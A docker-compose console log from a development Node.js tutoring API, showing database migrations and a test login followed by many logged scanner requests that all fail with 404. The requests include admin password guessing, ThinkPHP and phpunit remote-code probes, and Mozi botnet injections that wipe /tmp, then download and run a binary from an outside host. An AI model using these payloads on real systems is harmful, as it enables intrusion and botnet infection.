Attaching to back-end-live-tutor_server_1, back-end-live-tutor_database_1
database_1  | The files belonging to this database system will be owned by user "postgres".
database_1  | 2020-12-31 09:36:51.266 UTC [1] LOG:  starting PostgreSQL 13.1 (Debian 13.1-1.pgdg100+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit
database_1  | 2020-12-31 09:36:51.268 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
database_1  | 2020-12-31 09:36:51.269 UTC [1] LOG:  listening on IPv6 address "::", port 5432
database_1  | 2020-12-31 09:36:51.270 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
database_1  | 2020-12-31 09:36:51.274 UTC [73] LOG:  database system was shut down at 2020-12-31 09:36:51 UTC
database_1  | 2020-12-31 09:36:51.278 UTC [1] LOG:  database system is ready to accept connections
server_1    | wait-for-it.sh: waiting 15 seconds for database:5432
server_1    | wait-for-it.sh: database:5432 is available after 2 seconds
server_1    | 
server_1    | > live-tutor-api@1.0.0 migrate /server
server_1    | > sequelize db:migrate:undo:all && sequelize db:migrate
server_1    | 
server_1    | 
server_1    | [4mSequelize CLI [Node: 14.15.3, CLI: 6.2.0, ORM: 6.3.5][24m
server_1    | 
server_1    | Loaded configuration file "src/database/config/config.js".
server_1    | Using environment "development".
server_1    | No executed migrations found.
server_1    | 
server_1    | [4mSequelize CLI [Node: 14.15.3, CLI: 6.2.0, ORM: 6.3.5][24m
server_1    | 
server_1    | Loaded configuration file "src/database/config/config.js".
server_1    | Using environment "development".
server_1    | == 20201209155808-user: migrating =======
server_1    | == 20201209155808-user: migrated (0.020s)
server_1    | 
server_1    | == 20201219073158-role: migrating =======
server_1    | == 20201219073158-role: migrated (0.010s)
server_1    | 
server_1    | == 20201219082620-user-role: migrating =======
server_1    | == 20201219082620-user-role: migrated (0.014s)
server_1    | 
server_1    | == 20201219082621-tutor: migrating =======
server_1    | == 20201219082621-tutor: migrated (0.012s)
server_1    | 
server_1    | 
server_1    | > live-tutor-api@1.0.0 migrate:seed /server
server_1    | > sequelize db:seed:undo:all && sequelize db:seed:all
server_1    | 
server_1    | 
server_1    | [4mSequelize CLI [Node: 14.15.3, CLI: 6.2.0, ORM: 6.3.5][24m
server_1    | 
server_1    | Loaded configuration file "src/database/config/config.js".
server_1    | Using environment "development".
server_1    | == fakeData: reverting =======
server_1    | == fakeData: reverted (1.117s)
server_1    | 
server_1    | == 20201219085443-tutor-data: reverting =======
server_1    | == 20201219085443-tutor-data: reverted (0.007s)
server_1    | 
server_1    | == 20201219085442-user-role-data copy: reverting =======
server_1    | == 20201219085442-user-role-data copy: reverted (0.003s)
server_1    | 
server_1    | == 20201219083329-role-data: reverting =======
server_1    | == 20201219083329-role-data: reverted (0.002s)
server_1    | 
server_1    | == 20201209155959-user-data: reverting =======
server_1    | == 20201209155959-user-data: reverted (0.002s)
server_1    | 
server_1    | 
server_1    | [4mSequelize CLI [Node: 14.15.3, CLI: 6.2.0, ORM: 6.3.5][24m
server_1    | 
server_1    | Loaded configuration file "src/database/config/config.js".
server_1    | Using environment "development".
server_1    | == 20201209155959-user-data: migrating =======
server_1    | == 20201209155959-user-data: migrated (0.588s)
server_1    | 
server_1    | == 20201219083329-role-data: migrating =======
server_1    | == 20201219083329-role-data: migrated (0.017s)
server_1    | 
server_1    | == 20201219085442-user-role-data copy: migrating =======
server_1    | == 20201219085442-user-role-data copy: migrated (0.032s)
server_1    | 
server_1    | == 20201219085443-tutor-data: migrating =======
server_1    | == 20201219085443-tutor-data: migrated (0.012s)
server_1    | 
server_1    | == fakeData: migrating =======
server_1    | == fakeData: migrated (0.001s)
server_1    | 
server_1    | 
server_1    | > live-tutor-api@1.0.0 start /server
server_1    | > nodemon --exec babel-node src/index.js
server_1    | 
server_1    | [33m[nodemon] 2.0.6[39m
server_1    | [33m[nodemon] to restart at any time, enter `rs`[39m
server_1    | [33m[nodemon] watching path(s): *.*[39m
server_1    | [33m[nodemon] watching extensions: js,mjs,json[39m
server_1    | [32m[nodemon] starting `babel-node src/index.js`[39m
server_1    | server started on port 6969 (development)
server_1    | Executing (default): SELECT 1+1 AS result
server_1    | Successfully connected to the database
server_1    | [0mGET /status [32m200[0m 6.199 ms - 16[0m
server_1    | [0mGET / [33m404[0m 1.375 ms - 40[0m
server_1    | [0mGET / [33m404[0m 1.119 ms - 40[0m
server_1    | Executing (default): SELECT "id", "email", "password", "avatar", "name", "country", "phone", "language", "birthday", "isActivated", "createdAt", "updatedAt", "deletedAt" FROM "Users" AS "User" WHERE ("User"."deletedAt" IS NULL AND "User"."email" = 'lem@gmail.com') LIMIT 1;
server_1    | [0mPOST /auth/login [33m401[0m 84.053 ms - 58[0m
server_1    | Executing (default): SELECT "id", "email", "password", "avatar", "name", "country", "phone", "language", "birthday", "isActivated", "createdAt", "updatedAt", "deletedAt" FROM "Users" AS "User" WHERE ("User"."deletedAt" IS NULL AND ("User"."email" = 'lem@gmail.com' AND "User"."id" IS NOT NULL)) LIMIT 1;
server_1    | Executing (default): INSERT INTO "Users" ("id","email","password","isActivated","createdAt","updatedAt") VALUES ($1,$2,$3,$4,$5,$6) RETURNING "id","email","password","avatar","name","country","phone","language","birthday","isActivated","createdAt","updatedAt","deletedAt";
server_1    | Executing (default): SELECT "id", "name", "createdAt", "updatedAt" FROM "Roles" AS "Role" WHERE "Role"."name" = 'student' LIMIT 1;
server_1    | Executing (default): INSERT INTO "UserRoles" ("userId","roleId","createdAt","updatedAt") VALUES ($1,$2,$3,$4) RETURNING "userId","roleId","createdAt","updatedAt";
server_1    | [0mPOST /auth/register [32m201[0m 560.137 ms - 411[0m
server_1    | Executing (default): SELECT "id", "email", "password", "avatar", "name", "country", "phone", "language", "birthday", "isActivated", "createdAt", "updatedAt", "deletedAt" FROM "Users" AS "User" WHERE ("User"."deletedAt" IS NULL AND "User"."email" = 'lem@gmail.com') LIMIT 1;
server_1    | [0mPOST /auth/login [32m200[0m 526.526 ms - 411[0m
server_1    | [0mGET / [33m404[0m 0.739 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=Password&user=admin [33m404[0m 0.645 ms - 40[0m
server_1    | [0mGET / [33m404[0m 1.139 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=Passwort&user=admin [33m404[0m 0.668 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.816 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.718 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.779 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=passwort&user=admin [33m404[0m 0.706 ms - 40[0m
server_1    | [0mGET /phpmyadmin/index.php [33m404[0m 0.649 ms - 40[0m
server_1    | [0mGET /pmd/index.php [33m404[0m 0.683 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=Kennwort&user=admin [33m404[0m 0.596 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.782 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=kennwort&user=admin [33m404[0m 0.653 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.642 ms - 40[0m
server_1    | [0mGET /HNAP1/ [33m404[0m 0.595 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=kennwort!&user=admin [33m404[0m 0.657 ms - 40[0m
server_1    | [0mPOST /boaform/admin/formLogin [33m404[0m 2.289 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=1234&user=admin [33m404[0m 0.823 ms - 40[0m
server_1    | [0mGET / [33m404[0m 1.058 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.702 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=12345&user=admin [33m404[0m 0.696 ms - 40[0m
server_1    | [0mGET /config/getuser?index=0 [33m404[0m 0.552 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.658 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.562 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.594 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.591 ms - 40[0m
server_1    | [0mGET /.env [33m404[0m 0.639 ms - 40[0m
server_1    | [0mPOST / [33m404[0m 1.633 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.606 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=123456&user=admin [33m404[0m 0.600 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.609 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.939 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.653 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=1234567&user=admin [33m404[0m 0.578 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=12345678&user=admin [33m404[0m 0.790 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.862 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.664 ms - 40[0m
server_1    | [0mGET /robots.txt [33m404[0m 0.712 ms - 40[0m
server_1    | [0mGET /sitemap.xml [33m404[0m 0.770 ms - 40[0m
server_1    | [0mGET /.well-known/security.txt [33m404[0m 0.839 ms - 40[0m
server_1    | [0mGET /favicon.ico [33m404[0m 0.800 ms - 40[0m
server_1    | [0mGET /manager/html/ [33m404[0m 0.628 ms - 40[0m
server_1    | [0mGET /manager/html/ [33m404[0m 0.579 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=123456789&user=admin [33m404[0m 0.589 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=1234567890&user=admin [33m404[0m 0.574 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.557 ms - 40[0m
server_1    | [0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [33m404[0m 0.518 ms - 40[0m
server_1    | [0mPOST /api/jsonws/invoke [33m404[0m 0.842 ms - 40[0m
server_1    | [0mGET /console/ [33m404[0m 0.616 ms - 40[0m
server_1    | [0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 [33m404[0m 0.560 ms - 40[0m
server_1    | [0mGET /solr/admin/info/system?wt=json [33m404[0m 0.543 ms - 40[0m
server_1    | [0mGET /?XDEBUG_SESSION_START=phpstorm [33m404[0m 0.610 ms - 40[0m
server_1    | [0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 0.549 ms - 40[0m
server_1    | [0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 1.555 ms - 40[0m
server_1    | [0mGET /wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.634 ms - 40[0m
server_1    | [0mPOST /Autodiscover/Autodiscover.xml [33m404[0m 0.647 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.538 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.520 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.521 ms - 40[0m
server_1    | [0mGET /wp-login.php [33m404[0m 0.828 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.559 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=1q2w3e4r&user=admin [33m404[0m 0.519 ms - 40[0m
server_1    | [0mGET /login [33m404[0m 0.549 ms - 40[0m
server_1    | [0mGET /manager/html [33m404[0m 0.605 ms - 40[0m
server_1    | [0mGET /phpmyadmin/index.php [33m404[0m 0.599 ms - 40[0m
server_1    | [0mGET /pmd/index.php [33m404[0m 0.638 ms - 40[0m
server_1    | [0mPOST /boaform/admin/formLogin [33m404[0m 0.982 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=admin&user=admin [33m404[0m 0.546 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.594 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.690 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.829 ms - 40[0m
server_1    | [0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://117.208.134.133:44855/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404[0m 0.592 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.576 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.576 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=admin&user=admin [33m404[0m 0.592 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.647 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=administrator&user=admin [33m404[0m 0.518 ms - 40[0m
server_1    | [0mPOST /boaform/admin/formLogin [33m404[0m 1.093 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.783 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=Admin&user=admin [33m404[0m 0.575 ms - 40[0m
server_1    | [0mGET /TP/public/index.php [33m404[0m 0.608 ms - 40[0m
server_1    | [0mGET /TP/index.php [33m404[0m 0.647 ms - 40[0m
server_1    | [0mGET /thinkphp/html/public/index.php [33m404[0m 0.725 ms - 40[0m
server_1    | [0mGET /html/public/index.php [33m404[0m 0.565 ms - 40[0m
server_1    | [0mGET /public/index.php [33m404[0m 0.650 ms - 40[0m
server_1    | [0mGET /TP/html/public/index.php [33m404[0m 0.704 ms - 40[0m
server_1    | [0mGET /elrekt.php [33m404[0m 0.830 ms - 40[0m
server_1    | [0mGET /index.php [33m404[0m 0.762 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.610 ms - 40[0m
server_1    | [0mGET /0bef [33m404[0m 0.752 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=Administrator&user=admin [33m404[0m 0.515 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.745 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.768 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.572 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.669 ms - 40[0m
server_1    | [0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [33m404[0m 0.597 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=kennwort1&user=admin [33m404[0m 0.694 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.548 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=password&user=admin [33m404[0m 0.882 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.843 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.698 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.815 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=Password&user=admin [33m404[0m 0.641 ms - 40[0m
server_1    | [0mGET /manager/text/list [33m404[0m 0.856 ms - 40[0m
server_1    | [0mGET / [33m404[0m 4.758 ms - 40[0m
server_1    | [0mGET / [33m404[0m 1.162 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=Passwort&user=admin [33m404[0m 0.557 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.704 ms - 40[0m
server_1    | [0mGET /bag2 [33m404[0m 0.582 ms - 40[0m
server_1    | [0mGET /phpmyadmin/ [33m404[0m 0.544 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.798 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.574 ms - 40[0m
server_1    | [0mGET /console [33m404[0m 0.590 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.695 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.665 ms - 40[0m
server_1    | [0mGET /console [33m404[0m 0.826 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.786 ms - 40[0m
server_1    | [0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 [33m404[0m 0.806 ms - 40[0m
server_1    | [0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 3.656 ms - 40[0m
server_1    | [0mPOST /Autodiscover/Autodiscover.xml [33m404[0m 0.726 ms - 40[0m
server_1    | [0mGET /solr/admin/info/system?wt=json [33m404[0m 0.656 ms - 40[0m
server_1    | [0mPOST /api/jsonws/invoke [33m404[0m 0.969 ms - 40[0m
server_1    | [0mGET /?XDEBUG_SESSION_START=phpstorm [33m404[0m 0.547 ms - 40[0m
server_1    | [0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [33m404[0m 0.568 ms - 40[0m
server_1    | [0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 0.630 ms - 40[0m
server_1    | [0mGET /console/ [33m404[0m 0.648 ms - 40[0m
server_1    | [0mGET /wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.574 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=passwort&user=admin [33m404[0m 0.558 ms - 40[0m
server_1    | [0mGET /manager/html [33m404[0m 0.579 ms - 40[0m
server_1    | [0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404[0m 0.936 ms - 40[0m
server_1    | [0mPOST /GponForm/diag_Form?images/ [33m404[0m 0.848 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=Kennwort&user=admin [33m404[0m 0.728 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.695 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=kennwort&user=admin [33m404[0m 0.743 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.531 ms - 40[0m
server_1    | [0mGET /favicon.ico [33m404[0m 0.687 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.600 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.765 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.585 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=kennwort!&user=admin [33m404[0m 0.670 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.640 ms - 40[0m
server_1    | [0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 0.966 ms - 40[0m
server_1    | [0mPOST /api/jsonws/invoke [33m404[0m 1.171 ms - 40[0m
server_1    | [0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 0.622 ms - 40[0m
server_1    | [0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 [33m404[0m 0.597 ms - 40[0m
server_1    | [0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [33m404[0m 0.727 ms - 40[0m
server_1    | [0mGET /solr/admin/info/system?wt=json [33m404[0m 0.752 ms - 40[0m
server_1    | [0mGET /?XDEBUG_SESSION_START=phpstorm [33m404[0m 0.599 ms - 40[0m
server_1    | [0mGET /wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.574 ms - 40[0m
server_1    | [0mGET /console/ [33m404[0m 0.899 ms - 40[0m
server_1    | [0mPOST /Autodiscover/Autodiscover.xml [33m404[0m 0.991 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.704 ms - 40[0m
server_1    | [0mGET /.env [33m404[0m 0.577 ms - 40[0m
server_1    | [0mPOST / [33m404[0m 2.600 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=1234&user=admin [33m404[0m 0.560 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.580 ms - 40[0m
server_1    | [0mPOST /GponForm/diag_Form?images/ [33m404[0m 0.602 ms - 40[0m
server_1    | [0mGET /azenv.php [33m404[0m 0.522 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=12345&user=admin [33m404[0m 0.520 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.586 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.794 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.597 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.581 ms - 40[0m
server_1    | [0mGET /config/getuser?index=0 [33m404[0m 0.526 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=123456&user=admin [33m404[0m 0.547 ms - 40[0m
server_1    | [0mGET /currentsetting.htm [33m404[0m 0.563 ms - 40[0m
server_1    | [0mGET /portal/redlion [33m404[0m 0.697 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=1234567&user=admin [33m404[0m 0.612 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.880 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.577 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.812 ms - 40[0m
server_1    | [0mGET /.env [33m404[0m 0.632 ms - 40[0m
server_1    | [0mGET /login [33m404[0m 7.319 ms - 40[0m
server_1    | [0mGET /manager/html [33m404[0m 1.513 ms - 40[0m
server_1    | [0mGET /boaform/admin/formLogin?username=admin&psd=admin [33m404[0m 0.613 ms - 40[0m
server_1    | [0mGET /0bef [33m404[0m 0.642 ms - 40[0m
server_1    | [0mGET /cgi-bin/authLogin.cgi?plain_pwd=12345678&user=admin [33m404[0m 0.764 ms - 40[0m
server_1    | [0mGET /.env [33m404[0m 0.609 ms - 40[0m
server_1    | [0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 0.699 ms - 40[0m
server_1    | [0mGET /vendor/phpunit/phpunit/src/Util/PHP/XsamXadoo_Bot.php [33m404[0m 0.608 ms - 40[0m
server_1    | [0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 0.659 ms - 40[0m
server_1    | [0mGET /vendor/phpunit/phpunit/src/Util/PHP/XsamXadoo_Bot_.php [33m404[0m 0.682 ms - 40[0m
server_1    | [0mGET /actuator/health [33m404[0m 0.668 ms - 40[0m
server_1    | [0mHEAD /robots.txt [33m404[0m 7.472 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.866 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.829 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.673 ms - 40[0m
server_1    | [0mGET /login [33m404[0m 0.770 ms - 40[0m
server_1    | [0mGET /manager/html [33m404[0m 0.588 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.765 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.591 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.574 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.919 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.634 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.505 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.788 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.683 ms - 40[0m
server_1    | [0mGET / [33m404[0m 4.755 ms - 40[0m
server_1    | [0mGET / [33m404[0m 1.861 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.715 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.542 ms - 40[0m
server_1    | [0mGET /hudson [33m404[0m 0.858 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.740 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.548 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.801 ms - 40[0m
server_1    | [0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 0.542 ms - 40[0m
server_1    | [0mPOST /api/jsonws/invoke [33m404[0m 2.391 ms - 40[0m
server_1    | [0mGET /solr/admin/info/system?wt=json [33m404[0m 0.645 ms - 40[0m
server_1    | [0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 [33m404[0m 0.592 ms - 40[0m
server_1    | [0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [33m404[0m 0.514 ms - 40[0m
server_1    | [0mGET /?XDEBUG_SESSION_START=phpstorm [33m404[0m 2.077 ms - 40[0m
server_1    | [0mPOST /Autodiscover/Autodiscover.xml [33m404[0m 0.553 ms - 40[0m
server_1    | [0mGET /console/ [33m404[0m 0.828 ms - 40[0m
server_1    | [0mGET /wp-content/plugins/wp-file-manager/readme.txt [33m404[0m 0.806 ms - 40[0m
server_1    | [0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404[0m 4.196 ms - 40[0m
server_1    | [0mGET /manager/html/ [33m404[0m 0.562 ms - 40[0m
server_1    | [0mGET /.env [33m404[0m 0.721 ms - 40[0m
server_1    | [0mPOST / [33m404[0m 2.264 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.616 ms - 40[0m
server_1    | [0mGET / [33m404[0m 0.641 ms - 40[0m
server_1    | [0mGET /manager/html/ [33m404[0m 0.898 ms - 40[0m
